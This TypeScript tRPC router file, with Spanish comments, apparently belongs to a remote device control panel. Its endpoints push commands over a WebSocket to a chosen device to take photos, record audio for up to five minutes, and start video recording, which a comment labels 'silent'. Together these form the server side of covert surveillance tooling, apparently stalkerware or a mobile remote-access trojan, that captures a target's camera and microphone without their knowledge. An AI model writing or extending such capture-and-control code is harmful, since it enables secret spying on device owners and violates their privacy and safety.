import { z } from "zod";
import { router, protectedProcedure } from "../_core/trpc";
import { TRPCError } from "@trpc/server";
import { RemoteCommandType, createRemoteCommand, commandQueue, logRemoteCommand } from "../remoteControl";

export const mediaCaptureRouter = router({
  /**
   * Tomar una foto remota
   */
  takePhoto: protectedProcedure
    .input(
      z.object({
        deviceId: z.number(),
        camera: z.enum(["front", "back"]).default("back"),
        flash: z.boolean().default(false),
      })
    )
    .mutation(async ({ input, ctx }) => {
      try {
        const command = createRemoteCommand(
          input.deviceId,
          ctx.user.id,
          RemoteCommandType.TAKE_PHOTO,
          { camera: input.camera, flash: input.flash },
          "high"
        );

        commandQueue.enqueue(command);
        await logRemoteCommand(ctx.user.id, input.deviceId, RemoteCommandType.TAKE_PHOTO, "success", { commandId: command.commandId });

        // [PLATINUM FIX] Direct WebSocket broadcast
        const { getWebSocketManager } = await import("../websocket");
        const wsManager = getWebSocketManager();
        if (wsManager) {
          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
            action: RemoteCommandType.TAKE_PHOTO,
            commandId: command.commandId,
            payload: { camera: input.camera, flash: input.flash }
          });
        }

        return { success: true, commandId: command.commandId, message: "Comando de captura de foto enviado" };
      } catch (error) {
        console.error("[MediaCapture] Error:", error);
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Error al enviar comando de foto" });
      }
    }),

  /**
   * Iniciar grabación de audio
   */
  recordAudio: protectedProcedure
    .input(
      z.object({
        deviceId: z.number(),
        durationSeconds: z.number().min(1).max(300).default(30),
      })
    )
    .mutation(async ({ input, ctx }) => {
      try {
        const command = createRemoteCommand(
          input.deviceId,
          ctx.user.id,
          RemoteCommandType.START_AUDIO_RECORDING,
          { duration: input.durationSeconds },
          "high"
        );

        commandQueue.enqueue(command);
        await logRemoteCommand(ctx.user.id, input.deviceId, RemoteCommandType.START_AUDIO_RECORDING, "success", { commandId: command.commandId });

        // [PLATINUM FIX] Direct WebSocket broadcast
        const { getWebSocketManager } = await import("../websocket");
        const wsManager = getWebSocketManager();
        if (wsManager) {
          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
            action: RemoteCommandType.START_AUDIO_RECORDING,
            commandId: command.commandId,
            payload: { duration: input.durationSeconds }
          });
        }

        return { success: true, commandId: command.commandId, message: "Grabación de audio iniciada" };
      } catch (error) {
        console.error("[MediaCapture] Error:", error);
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Error al iniciar grabación de audio" });
      }
    }),

  /**
   * Detener cualquier grabación en curso
   */
  stopRecording: protectedProcedure
    .input(
      z.object({
        deviceId: z.number(),
        type: z.enum(["audio", "video"]),
      })
    )
    .mutation(async ({ input, ctx }) => {
      const commandType = input.type === "audio" 
        ? RemoteCommandType.STOP_AUDIO_RECORDING 
        : RemoteCommandType.STOP_VIDEO_RECORDING;

      try {
        const command = createRemoteCommand(
          input.deviceId,
          ctx.user.id,
          commandType,
          {},
          "high"
        );

        commandQueue.enqueue(command);
        return { success: true, commandId: command.commandId };
      } catch (error) {
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Error al detener grabación" });
      }
    }),

  /**
   * Iniciar grabación de video (Silenciosa)
   */
  recordVideo: protectedProcedure
    .input(
      z.object({
        deviceId: z.number(),
        camera: z.enum(["front", "back"]).default("back"),
        durationSeconds: z.number().min(1).max(60).default(10),
      })
    )
    .mutation(async ({ input, ctx }) => {
      try {
        const command = createRemoteCommand(
          input.deviceId,
          ctx.user.id,
          RemoteCommandType.START_VIDEO_RECORDING,
          { camera: input.camera, duration: input.durationSeconds },
          "high"
        );

        commandQueue.enqueue(command);
        
        // [PLATINUM FIX] Direct WebSocket broadcast
        const { getWebSocketManager } = await import("../websocket");
        const wsManager = getWebSocketManager();
        if (wsManager) {
          wsManager.broadcastToDevice(input.deviceId, "execute-command", {
            action: RemoteCommandType.START_VIDEO_RECORDING,
            commandId: command.commandId,
            payload: { camera: input.camera, duration: input.durationSeconds }
          });
        }

        return { success: true, commandId: command.commandId, message: "Grabación de video iniciada" };
      } catch (error) {
        throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Error al iniciar video" });
      }
    }),
});
